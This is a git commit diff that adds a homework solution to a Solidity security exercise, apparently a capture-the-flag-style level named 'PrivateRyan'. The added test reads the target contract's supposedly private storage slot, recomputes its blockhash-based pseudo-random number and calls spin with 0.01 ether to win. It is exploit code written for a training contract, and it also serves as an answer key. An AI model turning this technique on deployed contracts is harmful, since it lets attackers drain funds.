4b72353b230be846866fb5ced4050ca1875a2325
Irlan Abushakhmanov <irlanidzzze@gmail.com>
2024-10-31 18:14:18 +0300

    hw2: privateRyab added solution

--- hw2/test/02_PrivateRyan.t.sol
+++ hw2/test/02_PrivateRyan.t.sol
@@ -15,9 +15,16 @@ contract PrivateRyanTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 seed = uint256(vm.load(address(instance), 0)); 
+        uint256 rand = myRand(seed);
+        instance.spin{value: 0.01 ether}(rand);
 
         checkSuccess();
+    }
+
+    function myRand(uint256 seed) internal view returns (uint256) {
+        uint256 hashVal = uint256(blockhash(block.number - seed));
+        return uint256((uint256(hashVal) / 1157920892373161954235709850086879078532699846656405640394575840079131296399)) % 100;
     }
 
     function checkSuccess() internal view override {
